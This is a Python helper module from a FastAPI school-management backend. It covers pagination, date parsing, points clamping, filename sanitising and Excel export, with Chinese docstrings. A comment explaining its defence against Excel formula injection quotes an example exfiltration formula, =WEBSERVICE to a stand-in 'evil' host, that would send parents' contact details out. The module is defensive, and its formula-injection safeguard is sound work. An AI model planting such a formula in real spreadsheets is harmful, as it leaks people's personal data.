import re
import uuid
from datetime import date, datetime

from fastapi import HTTPException
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.constants import (
    DEFAULT_PAGE_SIZE,
    MAX_PAGE_SIZE,
    POINTS_PER_RECORD_MAX,
    POINTS_PER_RECORD_MIN,
)


def gen_student_no(db, student_model) -> str:
    """生成全局唯一学号（ZC + 日期 + 4 位随机），用于自助注册等无学号场景。"""
    for _ in range(50):
        no = "ZC" + datetime.now().strftime("%Y%m%d") + uuid.uuid4().hex[:4].upper()
        if not db.query(student_model).filter(student_model.student_no == no).first():
            return no
    raise RuntimeError("学号生成失败，请重试")


def to_dict(obj):
    """把 SQLAlchemy 模型实例转为字典（不含关系字段与内部状态）。"""
    if obj is None:
        return None
    return {c.name: getattr(obj, c.name) for c in obj.__table__.columns}


def stringify_dates(d: dict) -> dict:
    """把 dict 中的 ``date`` / ``datetime`` 值转为 ISO 字符串（原地修改并返回）。

    ⚠️ **FA-13（2026-11-18）之后，本函数不再被任何 ``*Out`` 响应模型路径使用。**
    全部 ``*Out`` 的日期字段已从 ``str`` 改为原生 ``date`` / ``datetime``（7 个 schema、
    10 个字段），由 FastAPI ``jsonable_encoder`` / Pydantic 直接输出 ISO 串，与列表接口
    走同一条路径。因此原先「``to_dict()`` + 带 str 日期字段的 ``response_model``」那条
    「写完库之后才抛 ``ResponseValidationError`` → 客户端 500 但数据已落库」的路径
    **已整类消失**。

    当前仅剩 3 处 AI DTO（手拼 dict、**无** ``response_model``）还在调用：
    ``services/ai_admin_service.py``（``usage_today``）、
    ``services/ai_companion.py``（``student_companion_quota`` / ``get_conversation``）。
    它们本来就在 ``jsonable_encoder`` 的覆盖范围内，这层调用属历史遗留，
    计划与 ``docs/API.md`` 的对应描述一并删除（独立提交）。
    """
    if not isinstance(d, dict):
        return d
    for k, v in list(d.items()):
        if isinstance(v, datetime):
            d[k] = v.isoformat()
        elif isinstance(v, date):
            d[k] = v.isoformat()
    return d


def normalize_page(
    page,
    page_size,
    max_size: int = MAX_PAGE_SIZE,
    default_size: int = DEFAULT_PAGE_SIZE,
):
    """规范化分页参数：page >= 1，1 <= page_size <= max_size。

    ``page_size`` 缺失 / 非数字时回落到 :data:`DEFAULT_PAGE_SIZE`，
    上限取 :data:`MAX_PAGE_SIZE` —— 两者都是业务口径，只在 ``constants.py`` 定义一次
    （R8 SMP-62：原先 20 / 200 是散落在 20+ 处的字面量）。
    """
    try:
        page = int(page or 1)
    except (TypeError, ValueError):
        page = 1
    try:
        page_size = int(page_size or default_size)
    except (TypeError, ValueError):
        page_size = default_size
    return max(1, page), min(max(1, page_size), max_size)


def order_direction(column, order=None):
    """把前端的 ``order=asc|desc`` 翻译成 SQLAlchemy 排序表达式。

    背景（RBT-122）：分页列表原先只在**前端**排当前页（`composables/useSort.js`
    的 `sortItems` 对已取回的 20 条排序），后端恒按 id 降序 ⇒ 翻到第 2 页点
    「最早在前」，只是把「最新 20 条」倒过来，页与页之间仍然是最新在前。

    🔴 这里**只认 ``asc``**，其余一切（None / 空串 / 拼错 / 大小写混杂）都回落
    ``desc``，绝不抛 400：排序方向是展示偏好，不是业务参数；前端 localStorage
    里可能存着旧值，翻页时突然报错比排错序更难排查。

    Args:
        column: 用于排序的列（`Model.id` / `Model.created_at` 等）。
        order: 前端传入的方向串。

    Returns:
        `column.asc()` 或 `column.desc()`，可直接交给 `.order_by(...)`。
    """
    return column.asc() if str(order or "").strip().lower() == "asc" else column.desc()


def parse_date(value):
    """把前端传入的日期归一化为 `date` 对象，供 `Date` 列写入。

    - `None` / 空串 → `None`
    - `date` 对象 → 原样返回
    - `'YYYY-MM-DD'` 字符串 → `date`
    - 其他格式 → 抛 `ValueError`（由调用方转为 400）
    """
    if value is None:
        return None
    if isinstance(value, date):
        return value
    if isinstance(value, str):
        value = value.strip()
        if not value:
            return None
        return datetime.strptime(value, "%Y-%m-%d").date()
    raise ValueError(f"无法解析的日期: {value!r}")


def parse_date_or_400(value):
    """解析日期，非法格式统一转 400（把「格式错误」从 500 收敛为客户端错误）。

    语义与 :func:`parse_date` 完全一致（`None` / 空串 → `None`，`date` 原样返回，
    `'YYYY-MM-DD'` → `date`），差别仅在于：当字符串格式非法时不再向上抛裸
    `ValueError`（会被 `main.py` 统一兜底成 **500**），而是转为
    ``HTTPException(400, "日期格式应为 YYYY-MM-DD")``。

    专供**写接口**在服务层直接表达「日期格式错误」；刻意**不改** ``parse_date`` 本身，
    因为导入等场景依赖其抛 ``ValueError`` 由各自逻辑处理（如逐行记录错误）。
    """
    try:
        return parse_date(value)
    except ValueError:
        raise HTTPException(status_code=400, detail="日期格式应为 YYYY-MM-DD")


def clamp_score(value, lo: float = 0.0, hi: float = 100.0) -> float:
    """把数值钳制到 [lo, hi] 区间（用于雷达分数等 0-100 指标，避免出现负分）。"""
    return max(lo, min(hi, value))


def clamp_points(value) -> int:
    """把单条表现积分钳制到 :data:`POINTS_PER_RECORD_MIN` ~ ``..._MAX``（RBT-82）。

    为什么钳在**服务层**而不是 schema 层：`PerformanceCreate` 的 `points` 允许缺省
    （留空按类型默认 +1 / -1），加 `ge/le` 会把「缺省仍 200」的既有语义改掉；
    而真正的危害是**值域**——教师可录 ±21 亿，直接污染 `sum(Performance.points)`
    的班级积分排名（排行条被一条记录拉满，几万条正常记录都修不回来）。
    所以「缺省」交给 schema、「越界」钳在写库前，两者互不干扰。

    Raises:
        HTTPException: 400 —— 非整数（防御性：schema 已做类型校验，走到这里说明
            有人绕过 schema 直接调 service）。
    """
    try:
        n = int(value)
    except (TypeError, ValueError):
        raise HTTPException(status_code=400, detail="积分必须是整数")
    return max(POINTS_PER_RECORD_MIN, min(POINTS_PER_RECORD_MAX, n))


def safe_filename(name: str) -> str:
    """过滤文件名中的非法字符，防止路径穿越。"""
    name = re.sub(r"[^\w.\-\u4e00-\u9fff]", "_", name or "")
    name = name.strip("._")
    return name or "file"


def db_today(db: Session) -> date:
    """取**数据库时钟**下的当天日期。

    额度统计必须与 `created_at` 用同一时间基准，否则会出现「进程本地凌晨 = 数据库
    前一天」的错位（SQLite 存 UTC、MySQL 存库本地时区，而 Python 取进程本地日期）。
    SQLite 的 `CURRENT_DATE` 返回字符串，MySQL 返回 `date`，这里统一成 `date`。
    """
    raw = db.execute(select(func.current_date())).scalar()
    if isinstance(raw, date):
        return raw
    return date.fromisoformat(str(raw)[:10])


# ---------------- Excel 导出：公式注入防护（SEC2-01 / CWE-1236） ----------------
# 背景：学生自助注册的姓名没有字符白名单，而 openpyxl 会把首字符 `=` 的字符串
# **自动置为公式**（`data_type == "f"`，XML 里出现 `<f>`）。教师打开导出文件即触发
# `=WEBSERVICE("http://evil/?"&TEXTJOIN(...))`，整片家长联系方式被外带。
#
# 防护：写单元格后强制 `data_type = "s"`（XML 写成 `t="inlineStr"`，且**不产生** `<f>`）。
# 实测（openpyxl 3.x）：`=1+1` / `=HYPERLINK(...)` 判为 `f`，置 `s` 后 `sheet1.xml`
# 里 `<f>` 计数为 0、`t="inlineStr"` 计数与字符串单元格数一致，读回仍为原字面量。
#
# 🔴 **只对字符串强制 `s`**，数字保持推断出的 `n`：
# 把 85 分也写成 inlineStr 会让 Excel 里整列成绩变文本，`=SUM()` 直接失效 ——
# 那是拿一个用户可见的功能回归去换一个数字本来就不存在的风险（数字不可能是公式）。


def safe_cell(ws, row_idx: int, col_idx: int, value) -> None:
    """写入单个单元格，字符串一律以文本形式落盘（防 Excel 公式注入）。

    Args:
        ws: openpyxl 的 worksheet。
        row_idx: 1 起始的行号。
        col_idx: 1 起始的列号。
        value: 单元格取值；``None`` 与数字保持 openpyxl 的默认类型推断。
    """
    cell = ws.cell(row=row_idx, column=col_idx, value=value)
    if isinstance(value, str):
        # 空串也走这里：统一成 inlineStr，避免下游出现混合类型
        cell.data_type = "s"


def safe_append(ws, values) -> None:
    """追加一行，并对其中字符串单元格套用 :func:`safe_cell` 的同一条防护。

    比逐个 ``safe_cell(ws, i, j, v)`` 好用：调用点继续用 ``ws.append([...])`` 的
    直观写法，行号由 ``ws.max_row`` 自动取，不会因为手工数列而错位。

    Args:
        ws: openpyxl 的 worksheet。
        values: 该行的单元格取值序列（顺序即列顺序）。
    """
    ws.append(list(values))
    row_idx = ws.max_row
    for col_idx, value in enumerate(values, 1):
        if isinstance(value, str):
            ws.cell(row=row_idx, column=col_idx).data_type = "s"
